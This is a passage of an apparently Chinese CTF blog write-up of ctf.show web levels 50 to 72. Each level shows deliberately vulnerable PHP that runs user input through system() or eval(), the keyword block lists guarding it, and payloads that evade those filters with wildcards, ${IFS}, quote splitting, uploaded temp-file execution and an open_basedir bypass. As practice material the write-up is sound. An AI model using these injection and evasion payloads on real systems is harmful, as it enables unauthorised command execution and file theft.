class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>PY:</p><p>51增加了过滤tac</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span>&lt;fla<span class="hljs-string">''</span>g.php||  <span class="hljs-comment">#查看源码</span><br>?c=<span class="hljs-built_in">tac</span>&lt;fla<span class="hljs-string">''</span>g.php||<br>?c=<span class="hljs-built_in">tac</span>&lt;fl<span class="hljs-string">''</span>ag.php%0a    <span class="hljs-comment">#%0a在URL中是换行符</span><br>两个单引号分割字符串，中间会自动忽略<br><span class="hljs-built_in">nl</span>-&gt;带行号读取,不支持通配符<br></code></pre></td></tr></tbody></table></figure><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>PY:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">payload1:<br>?c=<span class="hljs-built_in">cp</span><span class="hljs-variable">${IFS}</span>/fla?<span class="hljs-variable">${IFS}</span>a.txt||<span class="hljs-built_in">ls</span>  复制到a.txt<br>?c=<span class="hljs-built_in">nl</span><span class="hljs-variable">${IFS}</span>a.txt||<span class="hljs-built_in">ls</span>        直接访问a.txt也行<br>payload2:<br>?c=<span class="hljs-built_in">nl</span><span class="hljs-variable">${IFS}</span>/fla<span class="hljs-string">''</span>g||<span class="hljs-built_in">ls</span><br></code></pre></td></tr></tbody></table></figure><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, <span class="hljs-variable">$c</span>)){<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>.<span class="hljs-variable">$d</span>;<br>    }<span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'no'</span>;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>可以先传递ls，可以发现flag应该在flag.php中</p><p>PY:</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=c<span class="hljs-string">''</span>at<span class="hljs-variable">${</span><span class="hljs-variable constant_">IFS</span>}fla<span class="hljs-string">''</span>g.p<span class="hljs-string">''</span>hp<br><span class="hljs-string">?c</span>=nl<span class="hljs-variable">${</span><span class="hljs-variable constant_">IFS</span>}fla<span class="hljs-string">''</span>g.php<br><span class="hljs-string">?c</span>=cp<span class="hljs-variable">${</span><span class="hljs-variable constant_">IFS</span>}fla<span class="hljs-string">''</span>g.php<span class="hljs-variable">${</span><span class="hljs-variable constant_">IFS</span>}a.txt   <span class="hljs-comment">#访问a.txt</span><br></code></pre></td></tr></tbody></table></figure><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight asciidoc"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">if(isset($<span class="hljs-emphasis">_GET['c'])){</span><br><span class="hljs-emphasis">    $c=$_GET['c'];</span><br><span class="hljs-emphasis">    if(!preg_</span>match("/\;|.<span class="hljs-strong">*c.*a.*t.*</span>|.<span class="hljs-strong">*f.*l.*a.*g.*</span>| |[0-9]|\*|.<span class="hljs-strong">*m.*o.*r.*e.*</span>|.<span class="hljs-strong">*w.*g.*e.*t.*</span>|.<span class="hljs-strong">*l.*e.*s.*s.*</span>|.<span class="hljs-strong">*h.*e.*a.*d.*</span>|.<span class="hljs-strong">*s.*o.*r.*t.*</span>|.<span class="hljs-strong">*t.*a.*i.*l.*</span>|.<span class="hljs-strong">*s.*e.*d.*</span>|.<span class="hljs-strong">*c.*u.*t.*</span>|.<span class="hljs-strong">*t.*a.*c.*</span>|.<span class="hljs-strong">*a.*w.*k.*</span>|.<span class="hljs-strong">*s.*t.*r.*i.*n.*g.*s.*</span>|.<span class="hljs-strong">*o.*d.*</span>|.<span class="hljs-strong">*c.*u.*r.*l.*</span>|.<span class="hljs-strong">*n.*l.*</span>|.<span class="hljs-strong">*s.*c.*p.*</span>|.<span class="hljs-strong">*r.*m.*</span>|\`|\%|\x09|\x26|\&gt;|\&lt;/i", $c)){<br><span class="hljs-code">        system($c);</span><br><span class="hljs-code">    }</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>PY1:</p><p>过滤方式是通配符连接的cat,flag等等，我们可以使用mv命令</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">mv</span><span class="hljs-variable">${IFS}</span>fla?.php<span class="hljs-variable">${IFS}</span>a.txt<br>重命名后访问即可<br></code></pre></td></tr></tbody></table></figure><p>PY2:</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/bin/</span><span class="hljs-string">?a</span>t<span class="hljs-variable">${</span><span class="hljs-variable constant_">IFS</span>}f?<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br></code></pre></td></tr></tbody></table></figure><p>/bin目录下的cat命令执行查看文件</p><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>(1)/bin目录</p><p>bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等<br>这里我们可以利用 base64 中的64 进行通配符匹配 即 /bin/base64 flag.php</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/???/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-number">64</span> <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br></code></pre></td></tr></tbody></table></figure><p>(2) /ussr/bin目录</p><p>主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome<em>、zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、newaliases、nslookup passwd、quota、smb</em>、wget等。<br>可以利用/usr/bin下的bzip2 意思就是说我们先将flag.php文件进行压缩，然后再将其下载</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/???/</span><span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-number">2</span> <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br><span class="hljs-regexp">/flag.php.bz2</span><br></code></pre></td></tr></tbody></table></figure><p>(3)POST包</p><p>我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。[@-[]可以用来通配表示大写字母，过滤掉干扰文件，最后一位一般为大写，而在linux系统下.是可以用来执行任意脚本文件的，利用这两点，我们可以构造payload</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=.%<span class="hljs-number">20</span>/<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">?[</span>@-[]<br></code></pre></td></tr></tbody></table></figure><p>文件内容以 #!/bin/sh 开头</p><p>下带我们要执行的命令</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST数据包POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"http://cfe00e5c-379f-4958-a666-7b5ce9bcc58f.challenge.ctf.show/"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">"multipart/form-data"</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--目标网址--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"file"</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"file"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"提交"</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>方法1、2都是在字母被过滤而数字未被过滤的情况下，利用特定目录下的命令带数字(base64、bzip2)来定位我们要执行的命令，再利用通配符来达到CTF。</p><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>可以看到，再55题基础上，增加了过滤数字及一些符号，</p><p>参见无数字数字Getshell:<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">文章</a></p><figure class="highlight gradle"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle">用. <span class="hljs-keyword">file</span>执行文件，是不需要<span class="hljs-keyword">file</span>有x权限的。<br>这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<span class="hljs-regexp">/tmp/</span>phpXXXXXX，文件名最后<span class="hljs-number">6</span>个字符是随机的大小写字母<br><br>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。<br><br>翻开ascii码表，可见大写字母位于@与[之间,那么，我们可以利用[@-[]来表示大写字母.<br></code></pre></td></tr></tbody></table></figure><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><p>注意：flag in 36.php </p><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-string">"cat "</span>.<span class="hljs-symbol">$</span>c.<span class="hljs-string">".php"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>PY:</p><figure class="highlight arcade"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo $(()) <span class="hljs-comment">//运算符</span><br><span class="hljs-number">0</span><br>echo ~$(())<br>~<span class="hljs-number">0</span><br>echo $((~$(())))<br><span class="hljs-number">-1</span><br>echo $((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(()))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))<br><span class="hljs-number">-36</span>取反得到<span class="hljs-number">35</span><br>再增加一个<br>$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))<br></code></pre></td></tr></tbody></table></figure><h3 id="web59-65"><a href="#web59-65" class="headerlink" title="web59-65"></a>web59-65</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>])){<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>扫目录再读flag：</p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=print_r(scandir(dirname(<span class="hljs-string">'FILE'</span>)))<span class="hljs-comment">;</span><br><span class="hljs-attr">c</span>=show_source(<span class="hljs-string">'flag.php'</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></tbody></table></figure><p>PY2:</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">c</span>=<span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">next</span>(<span class="hljs-title">array_reverse</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">pos</span>(<span class="hljs-title">localeconv</span>())))));</span><br></code></pre></td></tr></tbody></table></figure><p>从59-65禁用的函数可能是不一样的，但是都没有禁用show_source函数，都可以用show_source来得到flag</p><h3 id="web66-67"><a href="#web66-67" class="headerlink" title="web66-67"></a>web66-67</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>])){<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>} <br></code></pre></td></tr></tbody></table></figure><p>首先要找到flag所在的文件</p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=var_dump(scandir(<span class="hljs-string">'/'</span>))<span class="hljs-comment">;</span><br><span class="hljs-attr">c</span>=print_r(scandir(<span class="hljs-string">'/'</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></tbody></table></figure><p>可以再根目录下找到flag.txt</p><p>从题目上也可以轻松看到highlight_file函数没有被ban掉：</p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=highlight_file(<span class="hljs-string">'/flag.txt'</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></tbody></table></figure><p>web67禁用了print_r函数</p><h3 id="web68-69-70"><a href="#web68-69-70" class="headerlink" title="web68,69,70"></a>web68,69,70</h3><p>禁用了highlight_file函数….</p><p>payload:</p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=include(<span class="hljs-string">'/flag.txt'</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></tbody></table></figure><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'display_errors'</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>])){<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">"/[0-9]|[a-z]/i"</span>,<span class="hljs-string">"?"</span>,<span class="hljs-variable">$s</span>);<br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>代码执行流程：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>]))：检查是否接收到名为 c 的 POST 请求参数。如果存在该参数，则继续执行下面的代码，否则不执行。<br><br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>];：将名为 c 的 POST 请求参数的值赋给变量 <span class="hljs-variable">$c</span>。这个变量将保存待执行的代码。<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);：使用 <span class="hljs-keyword">eval</span>() 函数执行 <span class="hljs-variable">$c</span> 变量中的代码。<span class="hljs-keyword">eval</span>() 函数会将字符串作为 PHP 代码进行解析和执行。<br><br><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();：通过使用输出缓冲区函数 <span class="hljs-title function_ invoke__">ob_get_contents</span>()，将执行代码后的输出内容保存到变量 <span class="hljs-variable">$s</span> 中。<br><br><span class="hljs-title function_ invoke__">ob_end_clean</span>();：使用 <span class="hljs-title function_ invoke__">ob_end_clean</span>() 函数清空输出缓冲区，确保后续的输出不会与之前的内容混合。<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">"/[0-9]|[a-z]/i"</span>,<span class="hljs-string">"?"</span>,<span class="hljs-variable">$s</span>);：对变量 <span class="hljs-variable">$s</span> 中的内容进行处理，并用 ? 替换其中的数字和字母。<span class="hljs-title function_ invoke__">preg_replace</span>() 函数执行正则表达式替换操作，将匹配到的数字和字母替换为 ?。最后，使用 <span class="hljs-keyword">echo</span> 语句将处理后的内容输出到浏览器。<br></code></pre></td></tr></tbody></table></figure><p>附件拿到源码，看到我们的命令行执行了但缓冲区被清除替换，我们看不到原本执行的内容，在include后面加上退出命令即可；</p><p>payload:</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">c=include(<span class="hljs-string">'/flag.txt'</span>);<span class="hljs-keyword">exit</span>;<br></code></pre></td></tr></tbody></table></figure><h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><p>尝试列目录，报错：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Operation not permitted <span class="hljs-keyword">in</span> <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/i</span>ndex.php(<span class="hljs-number">19</span>)<br></code></pre></td></tr></tbody></table></figure><p>包含读取文件目录都被open_basedir给限制了，采用glob绕过</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">c=<span class="hljs-variable">$a</span> = <span class="hljs-string">"glob:///*.txt"</span>;<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$b</span> = opendir(<span class="hljs-variable">$a</span>) ) {<br>                <span class="hljs-keyword">while</span> ( (<span 